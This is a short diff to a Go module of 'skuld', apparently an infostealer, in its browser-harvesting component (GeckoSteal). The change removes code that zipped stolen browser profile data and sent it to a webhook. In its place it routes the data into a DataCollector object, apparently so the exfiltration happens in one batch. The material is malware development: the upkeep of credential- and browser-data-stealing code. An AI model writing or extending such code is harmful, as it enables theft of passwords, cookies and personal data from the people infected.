@@ -4,7 +4,7 @@ import (
 	"fmt"
 	"github.com/hackirby/skuld/utils/fileutil"
 	"github.com/hackirby/skuld/utils/hardware"
-	"github.com/hackirby/skuld/utils/requests"
+	"github.com/hackirby/skuld/utils/collector"
 	"os"
 	"path/filepath"
 	"strings"
@@ -136,7 +136,7 @@ func GeckoSteal() []Profile {
 	return prof
 }
 
-func Run(webhook string) {
+func Run(dataCollector *collector.DataCollector) {
 	tempDir := filepath.Join(os.TempDir(), "browsers-temp")
 	os.MkdirAll(tempDir, os.ModePerm)
 
@@ -205,18 +205,7 @@ func Run(webhook string) {
 		}
 
 	}
-	tempZip := filepath.Join(os.TempDir(), "browsers.zip")
-	if err := fileutil.Zip(tempDir, tempZip); err != nil {
-		return
-	}
-	defer os.Remove(tempZip)
 
-	requests.Webhook(webhook, map[string]interface{}{
-		"embeds": []map[string]interface{}{
-			{
-				"title":       "Browsers",
-				"description": fmt.Sprintf("```%s```", fileutil.Tree(tempDir, "")),
-			},
-		},
-	}, tempZip)
+	// Add browsers data to collector
+	dataCollector.AddDirectory("browsers", tempDir, "browsers_data")
 }
